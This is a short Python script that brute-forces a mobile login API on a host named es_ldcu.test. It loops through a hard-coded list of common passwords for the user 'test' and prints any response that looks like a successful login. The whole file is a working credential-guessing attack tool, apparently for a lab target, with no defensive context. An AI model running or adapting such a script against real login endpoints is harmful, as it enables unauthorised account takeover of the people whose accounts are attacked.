import requests
import sys
from tqdm import tqdm

TARGET = "http://es_ldcu.test"
USERNAME = "test"

passwords = [
    "123456","password","12345678","qwerty","abc123",
    "password1","123456789","1234567","admin123"
]

url = f"{TARGET}/api/mobile/api_login"

for pwd in tqdm(passwords, desc="Bruteforcing passwords", unit="try"):
    try:
        r = requests.post(
            url,
            data={
                "username": USERNAME,
                "password": pwd
            },
            timeout=10
        )

        print(f"\n[*] Trying: {pwd}")
        print("Status:", r.status_code)

        try:
            data = r.json()
            print("JSON response:", data)

            if data.get("status") == "success" or data.get("success") is True:
                print(f"[+] LOGIN SUCCESS: {USERNAME}:{pwd}")
                break

        except ValueError:
            text = r.text.lower()
            print("Text response preview:", r.text[:200])

            if "success" in text or "dashboard" in text:
                print(f"[+] POSSIBLE SUCCESS: {USERNAME}:{pwd}")
                break

    except requests.exceptions.RequestException as e:
        print("Request failed:", e)
        continue
